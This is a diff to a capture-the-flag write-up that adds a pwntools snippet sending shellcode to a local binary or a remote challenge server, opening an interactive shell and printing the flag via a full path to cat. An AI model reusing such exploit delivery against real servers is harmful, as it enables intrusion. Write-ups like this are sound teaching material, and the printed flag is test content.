@@ -131,6 +131,17 @@ print(shellcode.hex())
 
 Once in the server, just cat the flag. Note that the server's `$PATH` was polluted and we need to use the full path to `cat`.
 
+```python
+# For local test
+r = process(binary_path)
+# For live challenge
+# r = remote(c'tf-85ib.balancedcompo.site', 9998) 
+
+r.read()
+r.sendline(shellcode.hex())
+r.interactive()
+```
+
 ```bash
 $ /bin/cat flag.txt
 DSO-NUS{a5a5ab1dc69bb9ffb55e75bdc290313d7d7137e653c98e66cc23dc042b2046bc}
